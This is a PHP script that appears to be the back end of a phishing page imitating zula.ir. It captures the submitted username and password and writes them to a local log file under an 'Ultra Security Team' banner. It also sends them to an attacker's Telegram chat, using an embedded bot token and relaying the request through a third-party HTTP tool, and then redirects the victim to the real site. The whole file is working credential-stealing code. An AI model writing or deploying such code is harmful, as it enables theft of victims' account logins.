<?php
$ss = '1509174957:AAH430gUW9bq33RcmOLrQOuZP_BtCwvuUZ8'; 
$chat_id = '1387002045'; // Your Telegram Chat ID
header("Location: https://zula.ir");
$a=fopen("logs.txt","a");
fwrite($a,"====== Ultra Security Team ======\r\n");
fwrite($a,"Username: "."$_POST[UserName]\r\n");
fwrite($a,"Password: "."$_POST[Password]\r\n");
fwrite($a,"Time: ".date('Y-m-d H:i:s')."\r\n");
fwrite($a,"====== Ultra Security Team ======\r\n\n");
date_default_timezone_set("Iran/Tehran");
$msg = "Username: "."$_POST[UserName]\r\n"."Password: "."$_POST[Password]\r\n"."Date: ".date("m/d/y")."\r\n";
$request_params = [
	'chat_id' => $chat_id,
	'text' => $msg
];
$request_url = 'https://api.telegram.org/bot'.$ss.'/sendMessage?' . http_build_query($request_params);
$params = [
	'UrlBox' => $request_url,
	'AgentList' => 'Mozilla Firefox',
	'VersionsList' => 'HTTP/1.1',
	'MethodList' => 'POST'
];
$ch = curl_init("https://www.httpdebugger.com/Tools/ViewHttpHeaders.aspx");
$parameters = http_build_query($params);
curl_setopt($ch, CURLOPT_POST, true);
curl_setopt($ch, CURLOPT_POSTFIELDS, $parameters);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_exec($ch);
curl_close($ch);

?>
